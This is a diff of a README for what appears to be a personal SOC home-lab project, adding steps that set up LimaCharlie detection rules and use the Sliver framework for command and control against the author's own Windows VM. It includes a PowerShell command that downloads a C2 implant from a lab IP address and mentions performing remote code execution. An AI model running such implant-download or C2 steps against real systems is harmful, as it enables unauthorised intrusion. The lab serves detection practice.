@@ -11,11 +11,28 @@ Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFi
 ```powershell
 Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
 ```
-
+## Start to attack
 - I use LimaCharlie (a SecOps cloud platform)
 ![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/bdce3c63-38eb-42a6-81f6-626cfc5138e1)
 - Follow these steps, and I reach this. It successfully creates the sensor
 ![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/a9985c93-978d-4c3a-83d8-5d23d9e3f49b)
+- Add rules to LimaCharlie
+![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/c60a1a58-90f5-49e8-9fc8-57e6c32b2feb)
+- Use Sliver to perform Command and Control 
+![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/ed2188db-ed14-4deb-ba1e-04fbe77b4733)
+- Download Command and Control file to Windows by this command
+```powershell
+IWR -Uri http://192.168.159.100/NORMAL_PUDDING.exe -Outfile C:\Users\hoang\Downloads\NORMAL_PUDDING.exe
+```
+- After running C2 on Windows VM, on Ubuntu Server, I see this
+![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/33fc3013-56ff-4faf-8156-b509c7033f27)
+- Perform RCE
+![image](https://github.com/buiduchoang24/SOC-Analyst/assets/166605385/6335a1a3-c0a5-4ee5-aa38-a7144931a26d)
+
+
+
+
+
 
 
 
